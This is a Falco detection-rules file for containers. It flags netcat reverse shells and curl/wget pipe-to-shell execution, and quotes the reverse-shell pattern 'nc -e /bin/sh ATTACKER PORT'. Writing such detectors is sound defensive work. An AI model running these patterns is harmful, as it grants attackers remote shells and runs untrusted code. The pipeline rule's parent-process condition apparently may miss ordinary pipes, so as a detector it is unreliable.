# Custom Falco rules for Scenario 3 — added to fill gaps in default OCI artifact
- macro: shell_binaries
  condition: (proc.name in (sh, bash, dash, ash, ksh, zsh, csh, tcsh))

- rule: Reverse shell via netcat -e
  desc: >
    Detect classic netcat reverse shell pattern (nc -e /bin/sh ATTACKER PORT).
    Triggers on netcat invocations with -e flag spawning a shell.
  condition: >
    spawned_process
    and container
    and proc.name in (nc, ncat, netcat)
    and (proc.cmdline contains "-e " or proc.cmdline contains "-c ")
  output: >
    Reverse shell via netcat in container (user=%user.name command=%proc.cmdline
    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
  tags: [network, mitre_execution, T1059]

- rule: Curl pipeline to shell
  desc: >
    Detects "curl ... | sh" or "wget ... | bash" patterns commonly used to
    download and immediately execute remote scripts.
  condition: >
    spawned_process
    and container
    and shell_binaries
    and proc.pname in (curl, wget)
  output: >
    Shell spawned by curl/wget pipeline in container (user=%user.name
    parent=%proc.pname command=%proc.cmdline container=%container.name
    pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [process, mitre_command_and_control, T1105]
